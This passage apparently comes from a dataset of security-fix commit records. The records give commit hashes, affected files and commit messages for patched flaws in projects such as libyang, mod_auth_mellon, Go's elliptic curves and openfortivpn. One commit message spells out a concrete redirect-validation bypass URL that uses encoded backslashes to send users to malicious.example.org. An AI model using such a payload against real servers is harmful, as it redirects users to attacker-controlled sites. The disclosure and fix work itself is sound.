lib: check frame_size is >= INT32_MAX\n\nWhen parsing a frame header, validate that the frame_size is less than or equal to INT32_MAX. Given frame_max is limited between 0 and INT32_MAX in amqp_login and friends, this does not change the API.\n\nThis prevents a potential buffer overflow when a malicious client sends a frame_size that is close to UINT32_MAX, in which causes an overflow when computing state->target_size resulting in a small value there. A buffer is then allocated with the small amount, then memcopy copies the frame_size writing to memory beyond the end of the buffer.

======================================================================
Commit With Fix: 
    3961268597abba4c2b231790cb4aa7936e73cdf8
File(s) In Commit: 
    applications/luci-app-firewall/luasrc/model/cbi/firewall/rule-details.lua
Blob(s) In Commit: 
    df66771299b82b83ba89500e425c5c202fe81f8e
Blob(s) Before Fix: 
    48329c8b219b92e4889c081430055fda006b87f1
Projects:
    0saga0_openwrt
Commit Message for 3961268597abba4c2b231790cb4aa7936e73cdf8:
luci-app-firewall: fix stored XSS in rule-details.lua\n\nA previous fix to this file failed to address a second instance of the same issue.\n\nFixes: c048f23ba ("luci-app-firewall: fix stored XSS in rule- and forward detail pages") Signed-off-by: Jo-Philipp Wich <jo@mein.io>

======================================================================
Commit With Fix: 
    f6d684ade99dd37b21babaa8a856f64faa1e2e0d
File(s) In Commit: 
    src/parser.c
Blob(s) In Commit: 
    e5d7ebbd692aa9b1dd0cd2c8d65d8d029dd42fd6
Blob(s) Before Fix: 
    38fd137bb6cf8370fda05ca3e8949aa5eaaf52e7
Projects:
    6WIND_libyang
Commit Message for f6d684ade99dd37b21babaa8a856f64faa1e2e0d:
parser BUGFIX long identity name buffer overflow\n\nSTRING_OVERFLOW (CWE-120)

======================================================================
Commit With Fix: 
    6980afae2ff9fcd6d67508b0a3f694d75fd059d6
File(s) In Commit: 
    src/parser.c
Blob(s) In Commit: 
    4828c7c0c8d64315c10bc2bd894db5816d114da7
Blob(s) Before Fix: 
    e5d7ebbd692aa9b1dd0cd2c8d65d8d029dd42fd6
Projects:
    6WIND_libyang
Commit Message for 6980afae2ff9fcd6d67508b0a3f694d75fd059d6:
parser BUGFIX long identityref default value buffer overflow\n\nSTRING_OVERFLOW (CWE-120)

======================================================================
Commit With Fix: 
    c1be55f97211d38b69ac0c2027e6812ab8b1b94e
File(s) In Commit: 
    src/http/ngx_http_special_response.c
Blob(s) In Commit: 
    76e6705889f8715bc83371c9111025983a134c45
Blob(s) Before Fix: 
    4ffb2cc8ad65ef4eac559c3bdac72e398a9a9e20
Projects:
    0x5446_lua-nginx-module
Commit Message for c1be55f97211d38b69ac0c2027e6812ab8b1b94e:
Discard request body when redirecting to a URL via error_page.\n\nReported by Bert JW Regeer and Francisco Oca Gonzalez.

======================================================================
Commit With Fix: 
    62041428a32de402e0be6ba45fe12df6a83bedb8
File(s) In Commit: 
    auth_mellon_util.c
Blob(s) In Commit: 
    fd442f90e4f12669e18f64095c441881b8614c8d
Blob(s) Before Fix: 
    0fab30914bb018f8af1377bc56ca17cc01f6a4ef
Projects:
    AzeemMalik51_mod_auth_mellon
Commit Message for 62041428a32de402e0be6ba45fe12df6a83bedb8:
Fix redirect URL validation bypass\n\nIt turns out that browsers silently convert backslash characters into forward slashes, while apr_uri_parse() does not.\n\nThis mismatch allows an attacker to bypass the redirect URL validation by using an URL like:\n\n  https://sp.example.org/mellon/logout?ReturnTo=https:%5c%5cmalicious.example.org/\n\nmod_auth_mellon will assume that it is a relative URL and allow the request to pass through, while the browsers will use it as an absolute url and redirect to https://malicious.example.org/ .\n\nThis patch fixes this issue by rejecting all redirect URLs with backslashes.

======================================================================
Commit With Fix: 
    42b42f71cf8f5956c09e66230293dfb5db652360
File(s) In Commit: 
    src/crypto/elliptic/elliptic.go
Blob(s) In Commit: 
    c84657c5e36777fcdf435b56ecf34d958f1b686f
Blob(s) Before Fix: 
    35aacf24e51520989ad3b969b957c07e9d6612b5
    4fc2b5e5213af7000b5bddfbf868c6128e334432
    ba673f80ca6f9454180bb06c56ee41e6a7a6c555
    c02df45d10502d129bf3bf48406593492d8d85c9
    d3527243e78a4f5fc755a91ed556b5f266eab101
    e6b59c5f436b9d24a8a61e093bd2adcc079e72ba
Projects:
    0leynikov_go
Commit Message for 42b42f71cf8f5956c09e66230293dfb5db652360:
[release-branch.go1.11-security] crypto/elliptic: reduce subtraction term to prevent long busy loop\n\nIf beta8 is unusually large, the addition loop might take a very long time to bring x3-beta8 back positive.\n\nThis would lead to a DoS vulnerability in the implementation of the P-521 and P-384 elliptic curves that may let an attacker craft inputs to ScalarMult that consume excessive amounts of CPU.\n\nThis fixes CVE-2019-6486.\n\nChange-Id: Ia969e8b5bf5ac4071a00722de9d5e4d856d8071a Reviewed-on: https://team-review.git.corp.google.com/c/399777 Reviewed-by: Adam Langley <agl@google.com> Reviewed-by: Julie Qiu <julieqiu@google.com> (cherry picked from commit 746d6abe2dfb9ce7609f8e1e1a8dcb7e221f423e) Reviewed-on: https://team-review.git.corp.google.com/c/401142 Reviewed-by: Filippo Valsorda <valsorda@google.com>

======================================================================
Commit With Fix: 
    75aa73267fdb1e0ebfbc00369e7312bac43d0566
File(s) In Commit: 
    libexif/exif-data.c
Blob(s) In Commit: 
    6332cd1ae3b0f6cc6db3694b25d3554ea81132c9
Blob(s) Before Fix: 
    a6f9c94f2fc2edd5d051c4b13e187002e1197ef9
Projects:
    Rishu_libexif
Commit Message for 75aa73267fdb1e0ebfbc00369e7312bac43d0566:
fix CVE-2019-9278\n\navoid the use of unsafe integer overflow checking constructs (unsigned integer operations cannot overflow, so "u1 + u2 > u1" can be optimized away)\n\ncheck for the actual sizes, which should also handle the overflows document other places google patched, but do not seem relevant due to other restrictions\n\nfixes https://github.com/libexif/libexif/issues/26

======================================================================
Commit With Fix: 
    eca42c66092b9031711afe215fbc1891ee55f143
File(s) In Commit: 
    CHANGELOG.md
Blob(s) In Commit: 
    1c8d8c6e6f78bceb91c59fd270d20fe869a04797
Blob(s) Before Fix: 
    79de470baf0c801eb7f11edbf97f912b9ec96fe5
Projects:
    06094051_rocksdb
Commit Message for eca42c66092b9031711afe215fbc1891ee55f143:
CHANGELOG: add note on vhost vulnerability\n\nSigned-off-by: Jim Harris <james.r.harris@intel.com> Change-Id: Id47256ecfc5d774e7d8054423cda32a90f0c4f76\n\nReviewed-on: https://review.gerrithub.io/c/442929 Chandler-Test-Pool: SPDK Automated Test System <sys_sgsw@intel.com> Tested-by: SPDK CI Jenkins <sys_sgci@intel.com> Reviewed-by: Darek Stojaczyk <dariusz.stojaczyk@intel.com> Reviewed-by: Tomasz Zawadzki <tomasz.zawadzki@intel.com>

======================================================================
Commit With Fix: 
    c28c5d29a3c61bc8110c11349e3f2309cd537cfa
File(s) In Commit: 
    web/file_manager/fm_api.php
Blob(s) In Commit: 
    cf4eef82a40388250037cd68455ab85f96d42524
Blob(s) Before Fix: 
    ac5faa3a21bd4da5bf2c8a3fdb92f5095cab8a33
Projects:
    001101_vesta
Commit Message for c28c5d29a3c61bc8110c11349e3f2309cd537cfa:
setting content type to fix possible XSS attack vector

======================================================================
Commit With Fix: 
    53a712bae5dd919521a58d7bad773b949358add0
File(s) In Commit: 
    arch/powerpc/kernel/idle_book3s.S
Blob(s) In Commit: 
    4a860d3b922962295dbec0764a734e61b1f63c03
Blob(s) Before Fix: 
    36178000a2f259a1d0dc47f7f561aa7affbf3a55
    7f5ac2e8581be7f56e552db87f5e0e165d39cddb
Projects:
    0-T-0_ps4-linux
Commit Message for 53a712bae5dd919521a58d7bad773b949358add0:
powerpc/powernv/idle: Restore AMR/UAMOR/AMOR after idle\n\nIn order to implement KUAP (Kernel Userspace Access Protection) on Power9 we will be using the AMR, and therefore indirectly the UAMOR/AMOR.\n\nSo save/restore these regs in the idle code.\n\nSigned-off-by: Michael Ellerman <mpe@ellerman.id.au>

======================================================================
Commit With Fix: 
    dae95a0baf3963a9ef87c17cee52f78f77e21829
File(s) In Commit: 
    base.php
Blob(s) In Commit: 
    441ade56829b5adb07cd2b8352bc632cce7f8bab
Blob(s) Before Fix: 
    e8234d6ba5e61c8ee6c26e5da8f9e8a3a833a37d
Projects:
    10gen-labs_mongo-php-library-prototype
Commit Message for dae95a0baf3963a9ef87c17cee52f78f77e21829:
ensure misuse of clear() wont open a vulnerability

======================================================================
Commit With Fix: 
    60660e00b80bad0fadcf39aee86f6f8756c94f91
File(s) In Commit: 
    src/tunnel.c
Blob(s) In Commit: 
    84ca7f4d685c68ee6c8386759a92b614d0acae53
Blob(s) Before Fix: 
    9b577e4422ff964c7d40b8da7ce4d28817d02400
Projects:
    Achal-Aggarwal_openfortivpn
Commit Message for 60660e00b80bad0fadcf39aee86f6f8756c94f91:
correctly check return value of X509_check_host\n\nCVE-2020-7041 incorrect use of X509_check_host (regarding return value) is fixed with this commit.\n\nThe flaw came in with #242 and prevented proper host name verification when openssl >= 1.0.2 was in use since openfortivpn 1.7.0.

======================================================================
Commit With Fix: 
    9eee997d599a89492281fc7ffdd79d88cd61afc3
File(s) In Commit: 
    src/tunnel.c
Blob(s) In Commit: 
    f0466a6bc8395e0d26973021386dd91bd89100f4
Blob(s) Before Fix: 
    84ca7f4d685c68ee6c8386759a92b614d0acae53
Projects:
    Achal-Aggarwal_openfortivpn
Commit Message for 9eee997d599a89492281fc7ffdd79d88cd61afc3:
supply proper input buffer to X509_check_host\n\nCVE-2020-7042 use of uninitialized memory in X509_check_host is fixed with this commit\n\nthe uninitialized buffer common_name was passed as argument to X509_check_host which prevented proper host name validation when openssl >= 1.0.2 was in use. This came in with #282 which went into openfortivpn 1.7.1. Unfortunately, this problem has stayed unnoticed because the return value was not properly checked either (which is a separate issue, with CVE-2020-7041, and which has been fixed by the previous commit)

======================================================================
Commit With Fix: 
    9dcfda045474d8903224d175907bfc29761dcb45
File(s) In Commit: 
    usr.sbin/smtpd/smtp_session.c
Blob(s) In Commit: 
    1af4c6f9776de1fe56f2564f8258f3a6fc5e076e
Blob(s) Before Fix: 
    f9cf444786ddaf56a0fc0d39ec36dddad278553e
Projects:
    Luigi30_src
Commit Message for 9dcfda045474d8903224d175907bfc29761dcb45:
Fix a security vulnerability discovered by Qualys which can lead to a privileges escalation on mbox deliveries and unprivileged code execution on lmtp deliveries, due to a logic issue causing a sanity check to be missed.\n\nok eric@, millert@

======================================================================
Commit With Fix: 
    d99bd8277d384f3417e917ce20bef5d061110343
File(s) In Commit: 
    lib/functions/tree.class.php
Blob(s) In Commit: 
    7458bc8b6803eaee49658b9d6515a0780cc9ae50
Blob(s) Before Fix: 
    f53a22fd16098ca09cc93926e69fdf6a9c954e8a
Projects:
    13812453806_testlink-code
Commit Message for d99bd8277d384f3417e917ce20bef5d061110343:
refactoring for security (www.ackcent.com)

======================================================================
Commit With Fix: 
    57d81ae350d569c5c95087997fe051c49e14516d
File(s) In Commit: 
    lib/keywords/keywordsImport.php
Blob(s) In Commit: 
    48b0ff17251aa5a1eb49cd40cb98efa5cc07d6bc
Blob(s) Before Fix: 
    71c7a13eed6a928133026e2e68e6bd0c60ef3261
Projects:
    13812453806_testlink-code
Commit Message for 57d81ae350d569c5c95087997fe051c49e14516d:
refactoring for security (www.ackcent.com)

======================================================================
Commit With Fix: 
    20f4e3d87e84663d922b937842fddd9af1b68dd9
File(s) In Commit: 
    www/includes/head.inc.php
Blob(s) In Commit: 
    9e17a2206379e0351b5c1456238fe733d11649f7
Blob(s) Before Fix: 
    76eb84761eb7b924c2c397c37bc8d1c261befbb6
Projects:
    fams_rconfig
Commit Message for 20f4e3d87e84663d922b937842fddd9af1b68dd9:
updated head.inc.php for 3.9.4

======================================================================
